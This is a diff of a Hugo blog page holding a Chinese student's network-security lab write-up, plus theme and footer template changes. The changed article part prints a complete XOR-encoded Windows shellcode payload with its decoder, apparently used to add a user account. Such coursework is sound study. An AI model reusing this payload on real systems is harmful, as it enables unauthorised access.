+</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="s2">&#34;\xd0\x96\x8e\x9f\x9a\xd0\x96\x90\x91\x8a\x9b\x75\x02\x96\xa9\x98&#34;</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="s2">&#34;\xf3\x01\x96\x9d\x77\x2f\xb1\x96\x37\x42\x58\x95\xa4\x16\xa8\xfe&#34;</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="s2">&#34;\xfe\xfe\x75\x0e\xa4\x16\xb0\xfe\xfe\xfe\x75\x26\x16\xfb\xfe\xfe&#34;</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="s2">&#34;\xfe\x17\x30\xfe\xfe\xfe\xaf\xac\xa8\xa9\xab\x75\x12\x75\x29\x7d&#34;</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="s2">&#34;\x12\xaa\x75\x02\x94\xea\xa7\xcd\x3e\x77\xfa\x71\x1c\x05\x38\xb9&#34;</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="s2">&#34;\xee\xba\x73\xb9\xee\xa9\xae\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94&#34;</span>
+</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="s2">&#34;\xfe\x94\xfe\xac\x94\xfe\x01\x28\x7d\x06\xfe\x8a\xfd\xae\x01\x2d&#34;</span>
+</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="s2">&#34;\x75\x1b\xa3\xa1\xa0\xa4\xa7\x3d\xa8\xad\xaf\xac\x16\xef\xfe\xfe&#34;</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="s2">&#34;\xfe\x7d\x06\xfe\x80\xf9\x75\x26\x16\xe9\xfe\xfe\xfe\xa4\xa7\xa5&#34;</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="s2">&#34;\xa0\x3d\x9a\x5f\xce\xfe\xfe\xfe\x75\xbe\xf2\x75\xbe\xe2\x75\xfe&#34;</span>
+</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="s2">&#34;\x75\xbe\xf6\x3d\x75\xbd\xc2\x75\xba\xe6\x86\xfd\x3d\x75\x0e\x75&#34;</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="s2">&#34;\xb0\xe6\x75\xb8\xde\xfd\x3d\x75\xba\x76\x02\xfd\x3d\xa9\x75\x06&#34;</span>
+</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="s2">&#34;\x16\xe9\xfe\xfe\xfe\xa1\xc5\x3c\x8a\xf8\x1c\x18\xcd\x3e\x15\xf5&#34;</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="s2">&#34;\x75\xb8\xe2\xfd\x3d\x75\xba\x76\x02\xfd\x3d\x3d\xad\xaf\xac\xa9&#34;</span>
+</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="s2">&#34;\xcd\x2c\xf1\x40\xf9\x7d\x06\xfe\x8a\xed\x75\x24\x75\x34\x3f\x1d&#34;</span>
+</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="s2">&#34;\xe7\x3f\x17\xf9\xf5\x27\x75\x2d\xfd\x2e\xb9\x15\x1b\x75\x3c\xa1&#34;</span>
+</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="s2">&#34;\xa4\xa7\xa5\x3d&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">45</span><span class="cl">        Success: encode is OK
+</span></span><span class="line"><span class="ln">46</span><span class="cl">
+</span></span><span class="line"><span class="ln">47</span><span class="cl">
+</span></span><span class="line"><span class="ln">48</span><span class="cl">
+</span></span><span class="line"><span class="ln">49</span><span class="cl">length of <span class="nv">shellcode</span> <span class="o">=</span> <span class="nv">315</span> <span class="o">=</span> 0x13b
+</span></span><span class="line"><span class="ln">50</span><span class="cl">/* <span class="nv">315</span><span class="o">=</span>0x13b bytes */
+</span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="s2">&#34;\xeb\x10\x5b\x53\x4b\x33\xc9\x66\xb9\x24\x01\x80\x34\x0b\xfe\xe2&#34;</span>
+</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="s2">&#34;\xfa\xc3\xe8\xeb\xff\xff\xff\xcd\x3e\xae\x96\xd1\x9f\x9a\x9a\x96&#34;</span>
+</span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="s2">&#34;\x8a\xce\xcf\xde\x96\xde\x8a\x9b\x8d\x96\x8b\x8d\x9b\x8c\x96\x9b&#34;</span>
+</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="s2">&#34;\x86\x9b\xde\x96\x90\x9b\x8a\xd0\x96\x8e\x9f\x9a\xd0\x96\x90\x91&#34;</span>
+</span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="s2">&#34;\x8a\x9b\x75\x02\x96\xa9\x98\xf3\x01\x96\x9d\x77\x2f\xb1\x96\x37&#34;</span>
+</span></span><span class="line"><span class="ln">56</span><span class="cl"><span class="s2">&#34;\x42\x58\x95\xa4\x16\xa8\xfe\xfe\xfe\x75\x0e\xa4\x16\xb0\xfe\xfe&#34;</span>
+</span></span><span class="line"><span class="ln">57</span><span class="cl"><span class="s2">&#34;\xfe\x75\x26\x16\xfb\xfe\xfe\xfe\x17\x30\xfe\xfe\xfe\xaf\xac\xa8&#34;</span>
+</span></span><span class="line"><span class="ln">58</span><span class="cl"><span class="s2">&#34;\xa9\xab\x75\x12\x75\x29\x7d\x12\xaa\x75\x02\x94\xea\xa7\xcd\x3e&#34;</span>
+</span></span><span class="line"><span class="ln">59</span><span class="cl"><span class="s2">&#34;\x77\xfa\x71\x1c\x05\x38\xb9\xee\xba\x73\xb9\xee\xa9\xae\x94\xfe&#34;</span>
+</span></span><span class="line"><span class="ln">60</span><span class="cl"><span class="s2">&#34;\x94\xfe\x94\xfe\x94\xfe\x94\xfe\x94\xfe\xac\x94\xfe\x01\x28\x7d&#34;</span>
+</span></span><span class="line"><span class="ln">61</span><span class="cl"><span class="s2">&#34;\x06\xfe\x8a\xfd\xae\x01\x2d\x75\x1b\xa3\xa1\xa0\xa4\xa7\x3d\xa8&#34;</span>
+</span></span><span class="line"><span class="ln">62</span><span class="cl"><span class="s2">&#34;\xad\xaf\xac\x16\xef\xfe\xfe\xfe\x7d\x06\xfe\x80\xf9\x75\x26\x16&#34;</span>
+</span></span><span class="line"><span class="ln">63</span><span class="cl"><span class="s2">&#34;\xe9\xfe\xfe\xfe\xa4\xa7\xa5\xa0\x3d\x9a\x5f\xce\xfe\xfe\xfe\x75&#34;</span>
+</span></span><span class="line"><span class="ln">64</span><span class="cl"><span class="s2">&#34;\xbe\xf2\x75\xbe\xe2\x75\xfe\x75\xbe\xf6\x3d\x75\xbd\xc2\x75\xba&#34;</span>
+</span></span><span class="line"><span class="ln">65</span><span class="cl"><span class="s2">&#34;\xe6\x86\xfd\x3d\x75\x0e\x75\xb0\xe6\x75\xb8\xde\xfd\x3d\x75\xba&#34;</span>
+</span></span><span class="line"><span class="ln">66</span><span class="cl"><span class="s2">&#34;\x76\x02\xfd\x3d\xa9\x75\x06\x16\xe9\xfe\xfe\xfe\xa1\xc5\x3c\x8a&#34;</span>
+</span></span><span class="line"><span class="ln">67</span><span class="cl"><span class="s2">&#34;\xf8\x1c\x18\xcd\x3e\x15\xf5\x75\xb8\xe2\xfd\x3d\x75\xba\x76\x02&#34;</span>
+</span></span><span class="line"><span class="ln">68</span><span class="cl"><span class="s2">&#34;\xfd\x3d\x3d\xad\xaf\xac\xa9\xcd\x2c\xf1\x40\xf9\x7d\x06\xfe\x8a&#34;</span>
+</span></span><span class="line"><span class="ln">69</span><span class="cl"><span class="s2">&#34;\xed\x75\x24\x75\x34\x3f\x1d\xe7\x3f\x17\xf9\xf5\x27\x75\x2d\xfd&#34;</span>
+</span></span><span class="line"><span class="ln">70</span><span class="cl"><span class="s2">&#34;\x2e\xb9\x15\x1b\x75\x3c\xa1\xa4\xa7\xa5\x3d&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">71</span><span class="cl">
+</span></span><span class="line"><span class="ln">72</span><span class="cl">命令成功完成。
+</span></span><span class="line"><span class="ln">73</span><span class="cl">
+</span></span><span class="line"><span class="ln">74</span><span class="cl">
+</span></span><span class="line"><span class="ln">75</span><span class="cl">
+</span></span><span class="line"><span class="ln">76</span><span class="cl">Z:<span class="se">\t</span>oStudentCh11-3&gt;
+</span></span></code></pre></div><h3 id="查看用户">查看用户
+</h3><p><img src="https://cdn.jsdelivr.net/gh/Anonymity-0/Picgo@note_picture/img/IMG_2950.5a07nmrq7p40.webp"
 	
 	
 	
@@ -553,7 +444,8 @@ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2
                 >
             </script><script>
     window.addEventListener("DOMContentLoaded", () => {
-        renderMathInElement(document.querySelector(`.article-content`), {
+	const mainArticleElement = document.querySelector(".main-article");
+        renderMathInElement(mainArticleElement, {
             delimiters: [
                 { left: "$$", right: "$$", display: true },
                 { left: "$", right: "$", display: false },
@@ -563,87 +455,124 @@ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2
             ignoredClasses: ["gist"]
         });})
 </script>
-    
-</article>
 
     
+</article>
 
     
 
-<aside class="related-content--wrapper">
-    <h2 class="section-title">Related content</h2>
-    <div class="related-content">
-        <div class="flex article-list--tile">
-            
-                
-<article class="">
-    <a href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A8/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">网络安全作业8</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A6/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">网络安全作业6</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A5/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">网络安全作业5</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A4/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">网络安全作业4</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A2/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">网络安全作业2</h2>
-        </div>
-    </a>
-</article>
-
-            
-        </div>
-    </div>
-</aside>
-
+    <section class="related-articles-bottom">
+    <div class="related-articles-container">
+        <h3 class="related-articles-title">相关文章</h3><div class="related-articles-grid"><article class="related-article-card">
+                    <a href="https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A8/" class="related-article-link">
+                        <div class="related-article-content">
+                            <h4 class="related-article-title">网络安全作业8</h4>
+                            <div class="related-article-meta">
+                                <span class="related-article-date">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M8 2v4m8-4v4M3 10h18M5 4h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z"/>
+                                    </svg>
+                                    2023-12-18
+                                </span><span class="related-article-category">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M3 7v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2H5a2 2 0 0 0-2-2z"/>
+                                        <path d="M8 5v6m8-6v6m-8-2h8"/>
+                                    </svg>
+                                    网络安全
+                                </span></div></div>
+                    </a>
+                </article><article class="related-article-card">
+                    <a href="https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A6/" class="related-article-link">
+                        <div class="related-article-content">
+                            <h4 class="related-article-title">网络安全作业6</h4>
+                            <div class="related-article-meta">
+                                <span class="related-article-date">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M8 2v4m8-4v4M3 10h18M5 4h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z"/>
+                                    </svg>
+                                    2023-12-13
+                                </span><span class="related-article-category">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M3 7v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2H5a2 2 0 0 0-2-2z"/>
+                                        <path d="M8 5v6m8-6v6m-8-2h8"/>
+                                    </svg>
+                                    网络安全
+                                </span></div></div>
+                    </a>
+                </article><article class="related-article-card">
+                    <a href="https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A5/" class="related-article-link">
+                        <div class="related-article-content">
+                            <h4 class="related-article-title">网络安全作业5</h4>
+                            <div class="related-article-meta">
+                                <span class="related-article-date">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M8 2v4m8-4v4M3 10h18M5 4h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z"/>
+                                    </svg>
+                                    2023-11-24
+                                </span><span class="related-article-category">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M3 7v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2H5a2 2 0 0 0-2-2z"/>
+                                        <path d="M8 5v6m8-6v6m-8-2h8"/>
+                                    </svg>
+                                    网络安全
+                                </span></div></div>
+                    </a>
+                </article><article class="related-article-card">
+                    <a href="https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A4/" class="related-article-link">
+                        <div class="related-article-content">
+                            <h4 class="related-article-title">网络安全作业4</h4>
+                            <div class="related-article-meta">
+                                <span class="related-article-date">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M8 2v4m8-4v4M3 10h18M5 4h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z"/>
+                                    </svg>
+                                    2023-11-15
+                                </span><span class="related-article-category">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M3 7v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2H5a2 2 0 0 0-2-2z"/>
+                                        <path d="M8 5v6m8-6v6m-8-2h8"/>
+                                    </svg>
+                                    网络安全
+                                </span></div></div>
+                    </a>
+                </article><article class="related-article-card">
+                    <a href="https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A2/" class="related-article-link">
+                        <div class="related-article-content">
+                            <h4 class="related-article-title">网络安全作业2</h4>
+                            <div class="related-article-meta">
+                                <span class="related-article-date">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M8 2v4m8-4v4M3 10h18M5 4h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z"/>
+                                    </svg>
+                                    2023-10-26
+                                </span><span class="related-article-category">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M3 7v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2H5a2 2 0 0 0-2-2z"/>
+                                        <path d="M8 5v6m8-6v6m-8-2h8"/>
+                                    </svg>
+                                    网络安全
+                                </span></div></div>
+                    </a>
+                </article><article class="related-article-card">
+                    <a href="https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A3/" class="related-article-link">
+                        <div class="related-article-content">
+                            <h4 class="related-article-title">网络安全作业3</h4>
+                            <div class="related-article-meta">
+                                <span class="related-article-date">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M8 2v4m8-4v4M3 10h18M5 4h14a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2z"/>
+                                    </svg>
+                                    2023-10-26
+                                </span><span class="related-article-category">
+                                    <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M3 7v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2H5a2 2 0 0 0-2-2z"/>
+                                        <path d="M8 5v6m8-6v6m-8-2h8"/>
+                                    </svg>
+                                    网络安全
+                                </span></div></div>
+                    </a>
+                </article></div></div>
+</section>
      
     
         
@@ -658,8 +587,9 @@ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2
     data-reactions-enabled="1"
     data-emit-metadata="0"
     data-input-position="bottom"
-    data-theme="dark_high_contrast"
+    data-theme="noborder_light"
     data-lang="en"
+    data-loading=""
     crossorigin="anonymous"
     async
 ></script>
@@ -689,7 +619,7 @@ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2
 
         function handler() {
             if (document.documentElement.dataset.scheme === "light") {
-                setGiscusTheme('dark_high_contrast');
+                setGiscusTheme('noborder_light');
             } else {
                 setGiscusTheme('0');
             }
@@ -705,25 +635,140 @@ shellcode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 2
         
             2020 - 
         
-        2024 AGA
+        2025 
     </section>
     
     <section class="powerby">
         Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.21.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
     </section>
 </footer>
 
 
     
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
 
             </main>
         </div>
+        
+        
+        <button class="back-to-top" id="back-to-top" aria-label="回到顶部">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="m18 15-6-6-6 6"/>
+            </svg>
+        </button>
+        
+        <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                const backToTopButton = document.getElementById('back-to-top');
+                if (!backToTopButton) return;
+
+                
+                const toggleBackToTop = function() {
+                    if (window.pageYOffset > 300) {
+                        backToTopButton.classList.add('show');
+                    } else {
+                        backToTopButton.classList.remove('show');
+                    }
+                };
+
+                
+                const scrollToTop = function() {
+                    window.scrollTo({
+                        top: 0,
+                        behavior: 'smooth'
+                    });
+                };
+
+                
+                window.addEventListener('scroll', toggleBackToTop);
+                backToTopButton.addEventListener('click', scrollToTop);
+
+                
+                toggleBackToTop();
+            });
+        </script><script type="text/javascript" src="/ts/menuEffects.js" defer></script><script type="text/javascript" src="/js/force-white-background.min.js"></script>
+        
         <script 
                 src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                 
                 >
-            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+            </script><script type="text/javascript" src="/ts/main.87d72694fb97c84cb5cbf9b1a64d476a38e04a5706618a6ffe5b89c7db00488f.js" defer></script>
 <script>
     (function () {
         const customFont = document.createElement('link');
